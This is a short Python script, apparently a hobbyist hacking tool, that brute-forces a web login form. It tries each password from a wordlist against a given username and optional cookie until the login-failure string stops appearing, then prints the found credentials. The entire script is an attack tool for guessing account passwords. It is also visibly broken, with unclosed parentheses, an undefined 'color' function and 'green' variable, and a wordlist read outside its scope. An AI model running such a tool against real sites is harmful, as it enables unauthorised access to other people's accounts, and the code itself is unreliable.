import requests
from termcolor import colored

url = input(color('[+] Enter Page Url: '),green)
username = input('[+] Enter Username For The Account To BruteForce: ')
password_file = input('[+] Enter The Password File To Use: ')
login_failed_string = input('[+] Enter String That Occurs When Login Fails: ')
cookie_value = input('[+] Enter Cookie Value: '

def cracking(username, url):
	for password in passwords:
		password = password.strip()
		print(f'trying this password: {password}')
		data = {
			'username': username,
			'password': password,
			'Login': 'submit'
			}
		response = requests.post(url, data=data)
		if cookie_value != '':
			response = requests.get(url , params={
               	        'username': username,
                       	'password': password,
                       	'Login': 'Login'
                        }, cookies = {'Cookie': cookie_value}

		if login_failed_string in response.content.decode():
			pass
		else:
			print(color('[+] Found Username ==> ' + username), green)
			print(color('[+] Found Password ==> ' + password), green)
			exit()

with open(password_file, 'r') as passwords:
	cracking(username, url)

print('Password Not In List!!!')
